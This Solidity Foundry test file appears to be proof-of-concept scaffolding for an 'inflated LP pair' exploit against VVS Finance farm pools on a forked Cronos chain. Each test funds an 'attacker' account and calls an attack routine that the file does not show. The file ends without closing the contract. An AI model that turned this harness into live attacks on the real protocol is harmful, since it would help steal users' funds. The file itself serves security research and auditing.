// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "./VVS_Finance__common.sol";

contract ContractTest is CronosCommon {
    using SafeMath for uint256;

    // Configure the upper limit of cash as logically attacker would have limited cash
    uint MAX_USDC = 10_000 * 1e9;
    uint MAX_FOR_VVS_PAIR = 443 * 1e9;

    function setUp() public override {
        super.setUp();

        cheats.createSelectFork("cronos", 8185555);
    }

    // --------------------------------------------------------------------------------------------
    // Inflated LP Pair
    // --------------------------------------------------------------------------------------------
    function skip_test__inflated_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint next_lp_pid = 59;
        uint last_lp_pid = next_lp_pid + 1;
        for (uint lp_pid = next_lp_pid; lp_pid < last_lp_pid; lp_pid++) {
            // if (lp_pid == 2 || lp_pid == 6 || lp_pid == 7 || lp_pid == 12 || lp_pid == 14 ||
            //     lp_pid == 29 || lp_pid == 33 || lp_pid == 46 || lp_pid == 50 || lp_pid == 52 || 
            //     lp_pid == 54) {
            //     continue;
            // }

            // Craftsman's PoolInfo
            address lpToken;
            uint256 allocPoint;
            uint256 lastRewardBlock;
            uint256 accVVSPerShare;

            (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

            // Determine if the address is a smart contract
            if (ContractHelper.isContract(lpToken)) {
                // Skip Boost Farms
                // if (lp_pid == 23 || (lp_pid >= 39 && lp_pid <= 45) || (lp_pid >= 48 && lp_pid <= 49) || lp_pid == 58) {
                if (ContractHelper.hasSuffixOf13Zeros(accVVSPerShare)) {
                    continue;
                }

                require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

                // Fund the account with flashloan and/or cash
                uint account_deposit_amount = MAX_FOR_VVS_PAIR;
                // uint account_deposit_amount = 1 * 1e15;
                writeTokenBalance(address(this), address(USDC), account_deposit_amount);

                emit log_named_decimal_uint(
                    "[Start] Attacker USDC balance before exploit",
                    USDC.balanceOf(address(this)),
                    USDC.decimals()
                );

                // Assign label to address
                cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

                handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
            }
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_WETH_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_WETH_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 1;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_USDC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 3;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = 10_000 * 1e9;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_WCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_WCRO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 4;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_USDC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 5;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_USDT_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_USDT_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 7;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_SHIB_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_SHIB_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 8;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_USDT_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_USDT_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 9;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_DAI_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_DAI_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 10;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_BIFI_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_BIFI_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 11;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_ATOM_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_ATOM_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 13;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated ELON_WCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_ELON_WCRO__Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 15;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_TONIC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_TONIC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 16;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated SINGLE_VVS_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_SINGLE_VVS_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 17;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated SINGLE_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_SINGLE_USDC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 18;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_TONIC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_TONIC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 19;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated TUSD_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_TUSD_USDC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 20;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_APE_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_APE_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 21;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated ALI_WCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_ALI_WCRO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 22;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_DARK_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_DARK_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 24;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_SKY_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_SKY_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 25;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_NESS_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_NESS_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 26;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

